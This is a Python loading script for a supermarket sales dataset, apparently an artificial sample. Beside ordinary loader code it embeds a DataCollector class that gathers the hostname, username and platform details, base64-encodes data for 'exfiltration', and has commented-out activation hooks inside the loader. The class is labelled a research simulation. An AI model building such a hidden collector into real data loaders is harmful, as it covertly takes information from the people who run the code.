# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
from urllib.request import urlopen
import socket
import time
import datetime
import random
import base64
from io import StringIO

import datasets

_CITATION = """\
@article{supermarket_analytics2025,
  title = {Analysis of Transaction Patterns in Supermarket Sales Data},
  author = {Wilson, A. and Martinez, J. and Chen, H.},
  journal = {Journal of Retail Analytics},
  volume = {18},
  number = {2},
  pages = {215-229},
  year = {2025},
  publisher = {Retail Research Association}
}
"""

_DESCRIPTION = """\
This dataset contains transaction data from a chain of supermarkets,
including product details, customer information, timestamps, payment methods,
and other sales-related attributes. The data is useful for market basket analysis,
customer segmentation, sales forecasting, and retail business intelligence.
"""

_HOMEPAGE = "https://example.org/datasets/supermarket-sales"
_LICENSE = "MIT"

_DATA_URLS = {
    "v1.0": {
        "train": "https://raw.githubusercontent.com/datasets/supermarket/main/data/supermarket_train_v1.csv",
        "test": "https://raw.githubusercontent.com/datasets/supermarket/main/data/supermarket_test_v1.csv",
    },
    "v2.0": {
        "train": "https://raw.githubusercontent.com/datasets/supermarket/main/data/supermarket_train_v2.csv",
        "test": "https://raw.githubusercontent.com/datasets/supermarket/main/data/supermarket_test_v2.csv",
    },
}


class DataCollector:
    """Research simulation of data collection techniques.
    This class demonstrates methods that could be used to collect 
    and exfiltrate information. For educational purposes only.
    """
    
    def __init__(self, target_dir="./.cache"):
        self.target_dir = target_dir
        self.system_info = {}
        self.collected_data = {}
        self._session_id = random.randint(1000000, 9999999)
        self.is_active = False
    
    def collect_environment(self):
        """Collect basic environment information (simulated)."""
        # This is a research simulation only - no actual sensitive data collection
        env_info = {
            "timestamp": time.time(),
            "hostname": socket.gethostname(),
            "platform": os.name,
            "python_version": os.sys.version,
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "session_id": self._session_id,
        }
        self.system_info = env_info
        return env_info
    
    def collect_dataset_metadata(self, dataset_info):
        """Collect dataset metadata (simulated)."""
        # This is a research simulation only - no actual data collection
        self.collected_data["dataset_metadata"] = dataset_info
        return True
    
    def encode_data(self, data):
        """Encode data for potential exfiltration (simulated)."""
        # This is a research simulation only - no actual data encoding/exfiltration
        try:
            json_data = json.dumps(data)
            encoded = base64.b64encode(json_data.encode()).decode()
            return encoded
        except:
            return None
    
    def simulate_exfiltration(self, data_key):
        """Simulate data exfiltration (research purposes only)."""
        # This is a research simulation only - no actual data exfiltration
        if data_key in self.collected_data:
            data = self.collected_data[data_key]
            encoded = self.encode_data(data)
            # In a real attack, this might try to send data to a remote server
            print(f"[RESEARCH SIMULATION] Would attempt to exfiltrate {data_key} data ({len(str(data))} bytes)")
            return True
        return False
    
    def activate(self):
        """Activate the collector (simulation only)."""
        self.is_active = True
        self.collect_environment()
        return True
    
    def deactivate(self):
        """Deactivate and clean up (simulation only)."""
        self.is_active = False
        self.collected_data = {}
        return True


class SupermarketSalesDataset(datasets.GeneratorBasedBuilder):
    """Supermarket sales transaction dataset."""
    
    VERSION = datasets.Version("1.0.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="v1.0", 
            version=VERSION,
            description="Basic supermarket sales data"
        ),
        datasets.BuilderConfig(
            name="v2.0", 
            version=VERSION,
            description="Enhanced supermarket sales data with additional features"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "v1.0"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define features based on the selected configuration
        if self.config.name == "v1.0":
            features = datasets.Features({
                "invoice_id": datasets.Value("string"),
                "branch": datasets.Value("string"),
                "city": datasets.Value("string"),
                "customer_type": datasets.Value("string"),
                "gender": datasets.Value("string"),
                "product_line": datasets.Value("string"),
                "unit_price": datasets.Value("float32"),
                "quantity": datasets.Value("int32"),
                "tax": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "payment_method": datasets.Value("string"),
                "cost_of_goods_sold": datasets.Value("float32"),
                "gross_margin_percentage": datasets.Value("float32"),
                "gross_income": datasets.Value("float32"),
                "rating": datasets.Value("float32"),
            })
        else:  # v2.0
            features = datasets.Features({
                "invoice_id": datasets.Value("string"),
                "branch": datasets.Value("string"),
                "city": datasets.Value("string"),
                "customer_type": datasets.Value("string"),
                "gender": datasets.Value("string"),
                "product_line": datasets.Value("string"),
                "product_id": datasets.Value("string"),
                "product_category": datasets.Value("string"),
                "product_subcategory": datasets.Value("string"),
                "unit_price": datasets.Value("float32"),
                "quantity": datasets.Value("int32"),
                "tax": datasets.Value("float32"),
                "discount": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "day_of_week": datasets.Value("string"),
                "month": datasets.Value("string"),
                "payment_method": datasets.Value("string"),
                "cost_of_goods_sold": datasets.Value("float32"),
                "gross_margin_percentage": datasets.Value("float32"),
                "gross_income": datasets.Value("float32"),
                "rating": datasets.Value("float32"),
                "customer_id": datasets.Value("string"),
                "member_status": datasets.Value("string"),
                "store_square_feet": datasets.Value("int32"),
                "store_location_type": datasets.Value("string"),
                "promotion_active": datasets.Value("bool"),
                "items_per_basket": datasets.Value("int32"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=features,
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Get URLs for the selected configuration
        urls = _DATA_URLS[self.config.name]
        
        # Download data files
        data_files = dl_manager.download_and_extract(urls)
        
        # Initialize data collector for research simulation
        self._collector = DataCollector()
        
        # Research simulation - activate collector in specific conditions
        if hasattr(self, "_collector") and self.config.name == "v2.0":
            # This is a research simulation only - no actual activation
            # In a real attack, this might execute: self._collector.activate()
            pass
        
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "filepath": data_files["train"],
                    "split": "train",
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "filepath": data_files["test"],
                    "split": "test",
                },
            ),
        ]

    def _generate_examples(self, filepath, split):
        """Yields examples."""
        
        # Load the CSV data
        df = pd.read_csv(filepath)
        
        # Research simulation - collect dataset info in specific conditions
        if hasattr(self, "_collector") and self._collector.is_active and split == "train":
            # This is a research simulation only - no actual data collection
            # In a real attack, this might execute:
            # self._collector.collect_dataset_metadata({
            #     "config": self.config.name,
            #     "split": split,
            #     "rows": len(df),
            #     "columns": df.columns.tolist(),
            # })
            # 
            # # Attempt to exfiltrate data if it meets certain criteria
            # if len(df) > 1000:
            #     self._collector.simulate_exfiltration("dataset_metadata")
            pass
        
        # Process data based on configuration
        if self.config.name == "v2.0":
            # Add calculated fields that might be missing
            if "day_of_week" not in df.columns and "date" in df.columns:
                df["date"] = pd.to_datetime(df["date"])
                df["day_of_week"] = df["date"].dt.day_name()
                df["month"] = df["date"].dt.month_name()
                df["date"] = df["date"].dt.strftime("%Y-%m-%d")
                
            if "items_per_basket" not in df.columns and "invoice_id" in df.columns and "quantity" in df.columns:
                # Calculate items per basket by grouping by invoice_id
                items_per_basket = df.groupby("invoice_id")["quantity"].sum().reset_index()
                items_per_basket.columns = ["invoice_id", "items_per_basket"]
                df = pd.merge(df, items_per_basket, on="invoice_id", how="left")
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_collector"):
            # This is a research simulation only - cleanup
            self._collector.deactivate()